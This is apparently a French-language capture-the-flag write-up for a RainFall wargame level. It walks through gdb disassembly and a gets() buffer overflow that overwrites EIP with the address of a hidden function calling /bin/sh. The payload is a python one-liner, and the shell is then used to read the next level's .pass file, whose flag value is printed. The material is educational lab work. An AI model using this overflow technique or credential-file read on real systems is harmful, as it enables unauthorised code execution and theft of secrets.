@@ -1,0 +1,73 @@
+(gdb) disass main
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave
+   0x08048496 <+22>:	ret
+End of assembler dump.
+
+On observe l'appel a gets() qui d'apres le man a un bug : "Because it is impossible
+to tell without knowing the data in advance  how  many  characters gets()  will  read,
+and  because  gets()  will continue to store characters past the end of the buffer"
+
+On lance la commande suivante pour verifier que nous avons rien oublier :
+(gdb) info function
+All defined functions:
+
+Non-debugging symbols:
+...
+0x08048340  gets@plt
+0x08048350  fwrite@plt
+0x08048360  system@plt
+...
+0x08048444  run
+0x08048480  main
+...
+
+On observe un fwrite et system que nous n'avions pas remarque avant ainsi qu'une fontion run
+
+(gdb) disass run
+Dump of assembler code for function run:
+   0x08048444 <+0>:	push   ebp
+...
+   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+...
+End of assembler dump.
+
+On observe l'appel a system qui prend pour parametre 0x8048584.
+
+(gdb) x/s 0x8048584
+0x8048584:	"/bin/sh"
+
+donc system va lancer /bin/sh
+
+Commencons notre recherche d'exploit. Gets nous permet de faire un buffer overflow
+Pour ca il faut d'abord trouver la taille de notre buffer
+
+Je genere d'abord une string de 200 caractères (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
+qui ne contient pas 4 octets identiques.
+
+(gdb) r
+Starting program: /home/user/level1/level1
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+
+je lance le programme avec la string genere, cela me donne l'endroit ou le programme crash.
+Et enfin grace a l'adresse du crash nous pouvons determiner la taille du buffer qui est de 76.
+
+Nous allons essayer de reecrire EIP avec l'adresse de run afin de l'executer.
+Pour ca il nous faut une string de 76 characteres suivie de l'adresse de run 0x08048444.
+
+level1@RainFall:~$ (python -c 'print ("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
